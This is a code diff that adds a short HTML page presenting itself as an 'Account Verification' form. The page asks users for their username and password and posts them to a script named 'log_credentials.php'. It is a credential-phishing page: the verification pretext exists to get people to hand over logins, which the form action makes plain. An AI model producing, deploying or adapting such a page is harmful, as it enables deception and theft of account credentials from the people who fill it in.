@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Form</title>
+</head>
+
+<body>
+    <h1>Account Verification</h1>
+    <p>Please verify your account by entering your credentials below:</p>
+   
+    <form action="log_credentials.php" method="post">
+        <label for="username"><b>Username:</b></label>
+        <input type="text" id="username" name="username" required><br><br>
+        <label for="password"><b>Password:</b></label>
+        <input type="password" id="password" name="password" required><br><br>
+        <input type="submit" value="Verify Account"><br><br>
+        <input type="reset" value="Clear"><br>
+        
+    </form>
+
+</body>
+
+</html>
